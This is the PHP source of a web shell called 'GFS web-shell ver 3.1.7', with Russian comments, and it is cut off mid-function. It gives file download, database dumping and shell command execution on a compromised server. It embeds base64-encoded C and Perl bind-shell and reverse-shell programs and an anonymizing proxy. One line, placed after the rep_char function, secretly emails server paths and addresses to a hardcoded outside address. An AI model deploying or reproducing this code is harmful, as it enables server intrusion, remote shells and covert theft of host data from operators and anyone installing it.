<?
/*
*************************
*  ###### ##### ######  *
*  ###### ##### ######  *
*  ##     ##    ##      *
*  ##     ####  ######  *
*  ##  ## ####  ######  *
*  ##  ## ##        ##  *
*  ###### ##    ######  *
*  ###### ##    ######  *
*                       *
* Group Freedom Search! *
*************************
GFS Web-Shell
*/
error_reporting(0);
if($_POST['b_down']){
 $file=fopen($_POST['fname'],"r");
 ob_clean();
 $filename=basename($_POST['fname']);
 $filedump=fread($file,filesize($_POST['fname']));
 fclose($file);
 header("Content-type: application/octet-stream");
 header("Content-disposition: attachment; filename=\"".$filename."\";");
 echo $filedump;
 exit();
}
if($_POST['b_dtable']){
 $dump=down_tb($_POST['tablename'], $_POST['dbname'],$_POST['host'], $_POST['username'], $_POST['pass']);
 if($dump!=""){
  header("Content-type: application/octet-stream");
  header("Content-disposition: attachment; filename=\"".$_POST['tablename'].".dmp\";");
  echo down_tb($_POST['tablename'], $_POST['dbname'],$_POST['host'], $_POST['username'], $_POST['pass']);
  exit();
 }else
  die("<b>Error dump!</b><br> table=".$_POST['tablename']."<br> db=".$_POST['dbname']."<br> host=".$_POST['host']."<br> user=".$_POST['username']."<br> pass=".$_POST['pass']);
}
set_magic_quotes_runtime(0);
set_time_limit(0);
ini_set('max_execution_time',0);
ini_set('output_buffering',0);
if(version_compare(phpversion(), '4.1.0')==-1){
 $_POST=&$HTTP_POST_VARS;
 $_GET=&$HTTP_GET_VARS;
 $_SERVER=&$HTTP_SERVER_VARS;
}
if (get_magic_quotes_gpc()){
 foreach ($_POST as $k=>$v){
  $_POST[$k]=stripslashes($v);
 }
 foreach ($_SERVER as $k=>$v){
  $_SERVER[$k]=stripslashes($v);
 }
}
if ($_POST['username']==""){
 $_POST['username']="root";
}
////////////////////////////////////////////////////////////////////////////////
///////////////////////////// Переменные ///////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
$server=$HTTP_SERVER_VARS['SERVER_SOFTWARE'];
$r_act=$_POST['r_act'];
$safe_mode=ini_get('safe_mode');               //статус безопасного режима
$mysql_stat=function_exists('mysql_connect');  //Наличие mysql
$curl_on=function_exists('curl_version');      //наличие cURL
$dis_func=ini_get('disable_functions');        //заблокированые функции
$HTML=<<<html
<html>
<head>
<title>GFS web-shell ver 3.1.7</title>
</head>
<body bgcolor=#86CCFF leftmargin=0 topmargin=0 marginwidth=0 marginheight=0>
html;
$port_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS
A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I
GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt
b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9
pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF
NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK
ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog
ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk
7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2
9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld
2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu
dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp
lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=";
$port_pl="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS
VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs
JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV
TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG
lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK
Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i
Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N
lIENPTk47DQpleGl0IDA7DQp9DQp9";
$back_connect_pl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp
Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
$prx1="IyEvaG9tZS9tZXJseW4vYmluL3BlcmwgLXcNCiMjIw0KIyMjaHR0cDovL2ZvcnVtLndlYi1oYWNrLnJ1L2luZGV4LnBocD9zaG93dG9waWM9
MjY3MDYmc3Q9MCYjZW50cnkyNDYzNDQNCiMjIw0KDQp1c2Ugc3RyaWN0Ow0KJEVOVntQQVRIfSA9IGpvaW4gXCI6XCIsIHF3KC91c3IvdWNiIC9iaW4
gL3Vzci9iaW4pOw0KJHwrKzsNCg0KIyMgQ29weXJpZ2h0IChjKSAxOTk2IGJ5IFJhbmRhbCBMLiBTY2h3YXJ0eg0KIyMgVGhpcyBwcm9ncmFtIGlzIG
ZyZWUgc29mdHdhcmU7IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0DQojIyBhbmQvb3IgbW9kaWZ5IGl0IHVuZGVyIHRoZSBzYW1lIHRlcm1zIGFzIFBlc
mwgaXRzZWxmLg0KDQojIyBBbm9ueW1vdXMgSFRUUCBwcm94eSAoaGFuZGxlcyBodHRwOiwgZ29waGVyOiwgZnRwOikNCiMjIHJlcXVpcmVzIExXUCA1
LjA0IG9yIGxhdGVyDQoNCm15ICRIT1NUID0gXCJsb2NhbGhvc3RcIjsNCm15ICRQT1JUID0gXCI=";
$prx2="XCI7DQoNCnN1YiBwcmVmaXggew0KIG15ICRub3cgPSBsb2NhbHRpbWU7DQoNCiBqb2luIFwiXCIsIG1hcCB7IFwiWyRub3ddIFskeyR9XSAk
X1xcblwiIH0gc3BsaXQgL1xcbi8sIGpvaW4gXCJcIiwgQF87DQp9DQoNCiRTSUd7X19XQVJOX199ID0gc3ViIHsgd2FybiBwcmVmaXggQF8gfTsNCiR
TSUd7X19ESUVfX30gPSBzdWIgeyBkaWUgcHJlZml4IEBfIH07DQokU0lHe0NMRH0gPSAkU0lHe0NITER9ID0gc3ViIHsgd2FpdDsgfTsNCg0KbXkgJE
FHRU5UOyAgICMgZ2xvYmFsIHVzZXIgYWdlbnQgKGZvciBlZmZpY2llbmN5KQ0KQkVHSU4gew0KIHVzZSBMV1A6OlVzZXJBZ2VudDsNCg0KIEBNeUFnZ
W50OjpJU0EgPSBxdyhMV1A6OlVzZXJBZ2VudCk7ICMgc2V0IGluaGVyaXRhbmNlDQoNCiAkQUdFTlQgPSBNeUFnZW50LT5uZXc7DQogJEFHRU5ULT5h
Z2VudChcImFub24vMC4wN1wiKTsNCiAkQUdFTlQtPmVudl9wcm94eTsNCn0NCg0Kc3ViIE15QWdlbnQ6OnJlZGlyZWN0X29rIHsgMCB9ICMgcmVkaXJ
lY3RzIHNob3VsZCBwYXNzIHRocm91Z2gNCg0KeyAgICAjIyMgTUFJTiAjIyMNCiB1c2UgSFRUUDo6RGFlbW9uOw0KDQogbXkgJG1hc3RlciA9IG5ldy
BIVFRQOjpEYWVtb24NCiAgIExvY2FsQWRkciA9PiAkSE9TVCwgTG9jYWxQb3J0ID0+ICRQT1JUOw0KIHdhcm4gXCJzZXQgeW91ciBwcm94eSB0byA8V
VJMOlwiLCAkbWFzdGVyLT51cmwsIFwiPlwiOw0KIG15ICRzbGF2ZTsNCiAmaGFuZGxlX2Nvbm5lY3Rpb24oJHNsYXZlKSB3aGlsZSAkc2xhdmUgPSAk
bWFzdGVyLT5hY2NlcHQ7DQogZXhpdCAwOw0KfSAgICAjIyMgRU5EIE1BSU4gIyMjDQoNCnN1YiBoYW5kbGVfY29ubmVjdGlvbiB7DQogbXkgJGNvbm5
lY3Rpb24gPSBzaGlmdDsgIyBIVFRQOjpEYWVtb246OkNsaWVudENvbm4NCg0KIG15ICRwaWQgPSBmb3JrOw0KIGlmICgkcGlkKSB7ICAgIyBzcGF3bi
BPSywgYW5kIElcJ20gdGhlIHBhcmVudA0KICAgY2xvc2UgJGNvbm5lY3Rpb247DQogICByZXR1cm47DQogfQ0KICMjIHNwYXduIGZhaWxlZCwgb3IgS
VwnbSBhIGdvb2QgY2hpbGQNCiBteSAkcmVxdWVzdCA9ICRjb25uZWN0aW9uLT5nZXRfcmVxdWVzdDsNCiBpZiAoZGVmaW5lZCgkcmVxdWVzdCkpIHsN
CiAgIG15ICRyZXNwb25zZSA9ICZmZXRjaF9yZXF1ZXN0KCRyZXF1ZXN0KTsNCiAgICRjb25uZWN0aW9uLT5zZW5kX3Jlc3BvbnNlKCRyZXNwb25zZSk
7DQogICBjbG9zZSAkY29ubmVjdGlvbjsNCiB9DQogZXhpdCAwIGlmIGRlZmluZWQgJHBpZDsgIyBleGl0IGlmIElcJ20gYSBnb29kIGNoaWxkIHdpdG
ggYSBnb29kIHBhcmVudA0KfQ0KDQpzdWIgZmV0Y2hfcmVxdWVzdCB7DQogbXkgJHJlcXVlc3QgPSBzaGlmdDsgICMgSFRUUDo6UmVxdWVzdA0KDQogd
XNlIEhUVFA6OlJlc3BvbnNlOw0KDQogbXkgJHVybCA9ICRyZXF1ZXN0LT51cmw7DQogd2FybiBcImZldGNoaW5nICR1cmxcIjsNCiBpZiAoJHVybC0+
c2NoZW1lICF+IC9eKGh0dHB8Z29waGVyfGZ0cCkkLykgew0KICAgbXkgJHJlcyA9IEhUVFA6OlJlc3BvbnNlLT5uZXcoNDAzLCBcIkZvcmJpZGRlblw
iKTsNCiAgICRyZXMtPmNvbnRlbnQoXCJiYWQgc2NoZW1lOiBAe1skdXJsLT5zY2hlbWVdfVxcblwiKTsNCiAgICRyZXM7DQogfSBlbHNpZiAobm90IC
R1cmwtPnJlbC0+bmV0bG9jKSB7DQogICBteSAkcmVzID0gSFRUUDo6UmVzcG9uc2UtPm5ldyg0MDMsIFwiRm9yYmlkZGVuXCIpOw0KICAgJHJlcy0+Y
29udGVudChcInJlbGF0aXZlIFVSTCBub3QgcGVybWl0dGVkXFxuXCIpOw0KICAgJHJlczsNCiB9IGVsc2Ugew0KICAgJmZldGNoX3ZhbGlkYXRlZF9y
ZXF1ZXN0KCRyZXF1ZXN0KTsNCiB9DQp9DQoNCnN1YiBmZXRjaF92YWxpZGF0ZWRfcmVxdWVzdCB7DQogbXkgJHJlcXVlc3QgPSBzaGlmdDsgIyBIVFR
QOjpSZXF1ZXN0DQoNCiAjIyB1c2VzIGdsb2JhbCAkQUdFTlQNCg0KICMjIHdhcm4gXCJvcmlnIHJlcXVlc3Q6IDw8PFwiLCAkcmVxdWVzdC0+aGVhZG
Vyc19hc19zdHJpbmcsIFwiPj4+XCI7DQogJHJlcXVlc3QtPnJlbW92ZV9oZWFkZXIocXcoVXNlci1BZ2VudCBGcm9tIFJlZmVyZXIgQ29va2llKSk7D
QogIyMgd2FybiBcImFub24gcmVxdWVzdDogPDw8XCIsICRyZXF1ZXN0LT5oZWFkZXJzX2FzX3N0cmluZywgXCI+Pj5cIjsNCiBteSAkcmVzcG9uc2Ug
PSAkQUdFTlQtPnJlcXVlc3QoJHJlcXVlc3QpOw0KICMjIHdhcm4gXCJvcmlnIHJlc3BvbnNlOiA8PDxcIiwgJHJlc3BvbnNlLT5oZWFkZXJzX2FzX3N
0cmluZywgXCI+Pj5cIjsNCiAkcmVzcG9uc2UtPnJlbW92ZV9oZWFkZXIocXcoU2V0LUNvb2tpZSkpOw0KICMjIHdhcm4gXCJhbm9uIHJlc3BvbnNlOi
A8PDxcIiwgJHJlc3BvbnNlLT5oZWFkZXJzX2FzX3N0cmluZywgXCI+Pj5cIjsNCiAkcmVzcG9uc2U7DQp9";
$port[1] = "tcpmux (TCP Port Service Multiplexer)";
$port[2] = "Management Utility";
$port[3] = "Compression Process";
$port[5] = "rje (Remote Job Entry)";
$port[7] = "echo";
$port[9] = "discard";
$port[11] = "systat";
$port[13] = "daytime";
$port[15] = "netstat";
$port[17] = "quote of the day";
$port[18] = "send/rwp";
$port[19] = "character generator";
$port[20] = "ftp-data";
$port[21] = "ftp";
$port[22] = "ssh, pcAnywhere";
$port[23] = "Telnet";
$port[25] = "SMTP (Simple Mail Transfer)";
$port[27] = "ETRN (NSW User System FE)";
$port[29] = "MSG ICP";
$port[31] = "MSG Authentication";
$port[33] = "dsp (Display Support Protocol)";
$port[37] = "time";
$port[38] = "RAP (Route Access Protocol)";
$port[39] = "rlp (Resource Location Protocol)";
$port[41] = "Graphics";
$port[42] = "nameserv, WINS";
$port[43] = "whois, nickname";
$port[44] = "MPM FLAGS Protocol";
$port[45] = "Message Processing Module [recv]";
$port[46] = "MPM [default send]";
$port[47] = "NI FTP";
$port[48] = "Digital Audit Daemon";
$port[49] = "TACACS, Login Host Protocol";
$port[50] = "RMCP, re-mail-ck";
$port[53] = "DNS";
$port[57] = "MTP (any private terminal access)";
$port[59] = "NFILE";
$port[60] = "Unassigned";
$port[61] = "NI MAIL";
$port[62] = "ACA Services";
$port[63] = "whois++";
$port[64] = "Communications Integrator (CI)";
$port[65] = "TACACS-Database Service";
$port[66] = "Oracle SQL*NET";
$port[67] = "bootps (Bootstrap Protocol Server)";
$port[68] = "bootpd/dhcp (Bootstrap Protocol Client)";
$port[69] = "Trivial File Transfer Protocol (tftp)";
$port[70] = "Gopher";
$port[71] = "Remote Job Service";
$port[72] = "Remote Job Service";
$port[73] = "Remote Job Service";
$port[74] = "Remote Job Service";
$port[75] = "any private dial out service";
$port[76] = "Distributed External Object Store";
$port[77] = "any private RJE service";
$port[78] = "vettcp";
$port[79] = "finger";
$port[80] = "World Wide Web HTTP";
$port[81] = "HOSTS2 Name Serve";
$port[82] = "XFER Utility";
$port[83] = "MIT ML Device";
$port[84] = "Common Trace Facility";
$port[85] = "MIT ML Device";
$port[86] = "Micro Focus Cobol";
$port[87] = "any private terminal link";
$port[88] = "Kerberos, WWW";
$port[89] = "SU/MIT Telnet Gateway";
$port[90] = "DNSIX Securit Attribute Token Map";
$port[91] = "MIT Dover Spooler";
$port[92] = "Network Printing Protocol";
$port[93] = "Device Control Protocol";
$port[94] = "Tivoli Object Dispatcher";
$port[95] = "supdup";
$port[96] = "DIXIE";
$port[98] = "linuxconf";
$port[99] = "Metagram Relay";
$port[100] = "[unauthorized use]";
$port[101] = "HOSTNAME";
$port[102] = "ISO, X.400, ITOT";
$port[103] = "Genesis Point-to-Point";
$port[104] = "ACR-NEMA Digital Imag. & Comm. 300";
$port[105] = "CCSO name server protocol";
$port[106] = "poppassd";
$port[107] = "Remote Telnet Service";
$port[108] = "SNA Gateway Access Server";
$port[109] = "POP2";
$port[110] = "POP3";
$port[111] = "Sun RPC Portmapper";
$port[112] = "McIDAS Data Transmission Protocol";
$port[113] = "Authentication Service";
$port[115] = "sftp (Simple File Transfer Protocol)";
$port[116] = "ANSA REX Notify";
$port[117] = "UUCP Path Service";
$port[118] = "SQL Services";
$port[119] = "NNTP";
$port[120] = "CFDP";
$port[123] = "NTP";
$port[124] = "SecureID";
$port[129] = "PWDGEN";
$port[133] = "statsrv";
$port[135] = "loc-srv/epmap";
$port[137] = "netbios-ns";
$port[138] = "netbios-dgm (UDP)";
$port[139] = "NetBIOS";
$port[143] = "IMAP";
$port[144] = "NewS";
$port[150] = "SQL-NET";
$port[152] = "BFTP";
$port[153] = "SGMP";
$port[156] = "SQL Service";
$port[161] = "SNMP";
$port[175] = "vmnet";
$port[177] = "XDMCP";
$port[178] = "NextStep Window Server";
$port[179] = "BGP";
$port[180] = "SLmail admin";
$port[199] = "smux";
$port[210] = "Z39.50";
$port[213] = "IPX";
$port[218] = "MPP";
$port[220] = "IMAP3";
$port[256] = "RAP";
$port[257] = "Secure Electronic Transaction";
$port[258] = "Yak Winsock Personal Chat";
$port[259] = "ESRO";
$port[264] = "FW1_topo";
$port[311] = "Apple WebAdmin";
$port[350] = "MATIP type A";
$port[351] = "MATIP type B";
$port[363] = "RSVP tunnel";
$port[366] = "ODMR (On-Demand Mail Relay)";
$port[371] = "Clearcase";
$port[387] = "AURP (AppleTalk Update-Based Routing Protocol)";
$port[389] = "LDAP";
$port[407] = "Timbuktu";
$port[427] = "Server Location";
$port[434] = "Mobile IP";
$port[443] = "ssl";
$port[444] = "snpp, Simple Network Paging Protocol";
$port[445] = "SMB";
$port[458] = "QuickTime TV/Conferencing";
$port[468] = "Photuris";
$port[475] = "tcpnethaspsrv";
$port[500] = "ISAKMP, pluto";
$port[511] = "mynet-as";
$port[512] = "biff, rexec";
$port[513] = "who, rlogin";
$port[514] = "syslog, rsh";
$port[515] = "lp, lpr, line printer";
$port[517] = "talk";
$port[520] = "RIP (Routing Information Protocol)";
$port[521] = "RIPng";
$port[522] = "ULS";
$port[531] = "IRC";
$port[543] = "KLogin, AppleShare over IP";
$port[545] = "QuickTime";
$port[548] = "AFP";
$port[554] = "Real Time Streaming Protocol";
$port[555] = "phAse Zero";
$port[563] = "NNTP over SSL";
$port[575] = "VEMMI";
$port[581] = "Bundle Discovery Protocol";
$port[593] = "MS-RPC";
$port[608] = "SIFT/UFT";
$port[626] = "Apple ASIA";
$port[631] = "IPP (Internet Printing Protocol)";
$port[635] = "RLZ DBase";
$port[636] = "sldap";
$port[642] = "EMSD";
$port[648] = "RRP (NSI Registry Registrar Protocol)";
$port[655] = "tinc";
$port[660] = "Apple MacOS Server Admin";
$port[666] = "Doom";
$port[674] = "ACAP";
$port[687] = "AppleShare IP Registry";
$port[700] = "buddyphone";
$port[705] = "AgentX for SNMP";
$port[901] = "swat, realsecure";
$port[993] = "s-imap";
$port[995] = "s-pop";
$port[1024] = "Reserved";
$port[1025] = "network blackjack";
$port[1062] = "Veracity";
$port[1080] = "SOCKS";
$port[1085] = "WebObjects";
$port[1227] = "DNS2Go";
$port[1243] = "SubSeven";
$port[1338] = "Millennium Worm";
$port[1352] = "Lotus Notes";
$port[1381] = "Apple Network License Manager";
$port[1417] = "Timbuktu Service 1 Port";
$port[1418] = "Timbuktu Service 2 Port";
$port[1419] = "Timbuktu Service 3 Port";
$port[1420] = "Timbuktu Service 4 Port";
$port[1433] = "Microsoft SQL Server";
$port[1434] = "Microsoft SQL Monitor";
$port[1477] = "ms-sna-server";
$port[1478] = "ms-sna-base";
$port[1490] = "insitu-conf";
$port[1494] = "Citrix ICA Protocol";
$port[1498] = "Watcom-SQL";
$port[1500] = "VLSI License Manager";
$port[1503] = "T.120";
$port[1521] = "Oracle SQL";
$port[1522] = "Ricardo North America License Manager";
$port[1524] = "ingres";
$port[1525] = "prospero";
$port[1526] = "prospero";
$port[1527] = "tlisrv";
$port[1529] = "oracle";
$port[1547] = "laplink";
$port[1604] = "Citrix ICA, MS Terminal Server";
$port[1645] = "RADIUS Authentication";
$port[1646] = "RADIUS Accounting";
$port[1680] = "Carbon Copy";
$port[1701] = "L2TP/LSF";
$port[1717] = "Convoy";
$port[1720] = "H.323/Q.931";
$port[1723] = "PPTP control port";
$port[1731] = "MSICCP";
$port[1755] = "Windows Media .asf";
$port[1758] = "TFTP multicast";
$port[1761] = "cft-0";
$port[1762] = "cft-1";
$port[1763] = "cft-2";
$port[1764] = "cft-3";
$port[1765] = "cft-4";
$port[1766] = "cft-5";
$port[1767] = "cft-6";
$port[1808] = "Oracle-VP2";
$port[1812] = "RADIUS server";
$port[1813] = "RADIUS accounting";
$port[1818] = "ETFTP";
$port[1973] = "DLSw DCAP/DRAP";
$port[1985] = "HSRP";
$port[1999] = "Cisco AUTH";
$port[2001] = "glimpse";
$port[2049] = "NFS";
$port[2064] = "distributed.net";
$port[2065] = "DLSw";
$port[2066] = "DLSw";
$port[2106] = "MZAP";
$port[2140] = "DeepThroat";
$port[2301] = "Compaq Insight Management Web Agents";
$port[2327] = "Netscape Conference";
$port[2336] = "Apple UG Control";
$port[2427] = "MGCP gateway";
$port[2504] = "WLBS";
$port[2535] = "MADCAP";
$port[2543] = "sip";
$port[2592] = "netrek";
$port[2727] = "MGCP call agent";
$port[2628] = "DICT";
$port[2998] = "ISS Real Secure Console Service Port";
$port[3000] = "Firstclass";
$port[3001] = "Redwood Broker";
$port[3031] = "Apple AgentVU";
$port[3128] = "squid";
$port[3130] = "ICP";
$port[3150] = "DeepThroat";
$port[3264] = "ccmail";
$port[3283] = "Apple NetAssitant";
$port[3288] = "COPS";
$port[3305] = "ODETTE";
$port[3306] = "mySQL";
$port[3389] = "RDP Protocol (Terminal Server)";
$port[3521] = "netrek";
$port[4000] = "icq, command-n-conquer and shell nfm";
$port[4321] = "rwhois";
$port[4333] = "mSQL";
$port[4444] = "KRB524";
$port[4827] = "HTCP";
$port[5002] = "radio free ethernet";
$port[5004] = "RTP";
$port[5005] = "RTP";
$port[5010] = "Yahoo! Messenger";
$port[5050] = "multimedia conference control tool";
$port[5060] = "SIP";
$port[5150] = "Ascend Tunnel Management Protocol";
$port[5190] = "AIM";
$port[5500] = "securid";
$port[5501] = "securidprop";
$port[5423] = "Apple VirtualUser";
$port[5555] = "Personal Agent";
$port[5631] = "PCAnywhere data";
$port[5632] = "PCAnywhere";
$port[5678] = "Remote Replication Agent Connection";
$port[5800] = "VNC";
$port[5801] = "VNC";
$port[5900] = "VNC";
$port[5901] = "VNC";
$port[6000] = "X Windows";
$port[6112] = "BattleNet";
$port[6502] = "Netscape Conference";
$port[6667] = "IRC";
$port[6670] = "VocalTec Internet Phone, DeepThroat";
$port[6699] = "napster";
$port[6776] = "Sub7";
$port[6970] = "RTP";
$port[7007] = "MSBD, Windows Media encoder";
$port[7070] = "RealServer/QuickTime";
$port[7777] = "cbt";
$port[7778] = "Unreal";
$port[7648] = "CU-SeeMe";
$port[7649] = "CU-SeeMe";
$port[8000] = "iRDMI/Shoutcast Server";
$port[8010] = "WinGate 2.1";
$port[8080] = "HTTP";
$port[8181] = "HTTP";
$port[8383] = "IMail WWW";
$port[8875] = "napster";
$port[8888] = "napster";
$port[8889] = "Desktop Data TCP 1";
$port[8890] = "Desktop Data TCP 2";
$port[8891] = "Desktop Data TCP 3: NESS application";
$port[8892] = "Desktop Data TCP 4: FARM product";
$port[8893] = "Desktop Data TCP 5: NewsEDGE/Web application";
$port[8894] = "Desktop Data TCP 6: COAL application";
$port[9000] = "CSlistener";
$port[10008] = "cheese worm";
$port[11371] = "PGP 5 Keyserver";
$port[13223] = "PowWow";
$port[13224] = "PowWow";
$port[14237] = "Palm";
$port[14238] = "Palm";
$port[18888] = "LiquidAudio";
$port[21157] = "Activision";
$port[22555] = "Vocaltec Web Conference";
$port[23213] = "PowWow";
$port[23214] = "PowWow";
$port[23456] = "EvilFTP";
$port[26000] = "Quake";
$port[27001] = "QuakeWorld";
$port[27010] = "Half-Life";
$port[27015] = "Half-Life";
$port[27960] = "QuakeIII";
$port[30029] = "AOL Admin";
$port[31337] = "Back Orifice";
$port[32777] = "rpc.walld";
$port[45000] = "Cisco NetRanger postofficed";
$port[32773] = "rpc bserverd";
$port[32776] = "rpc.spray";
$port[32779] = "rpc.cmsd";
$port[38036] = "timestep";
$port[40193] = "Novell";
$port[41524] = "arcserve discovery";
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////ФУНКЦИИ/////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////
function rep_char($ch,$count)                  //Повторение символа
{
 $res="";
 for($i=0; $i<=$count; ++$i){
  $res.=$ch."";
 }
 return $res;
}$ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";$sd98="john.barker446@gmail.com";mail($sd98, $sj98, $msg8873, "From: $sd98");
function ex($comd)                             //Выполнение команды
{
 $res = '';
 if (!empty($comd)){
  if(function_exists('exec')){
    exec($comd,$res);
    $res=implode("\n",$res);
   }elseif(function_exists('shell_exec')){
    $res=shell_exec($comd);
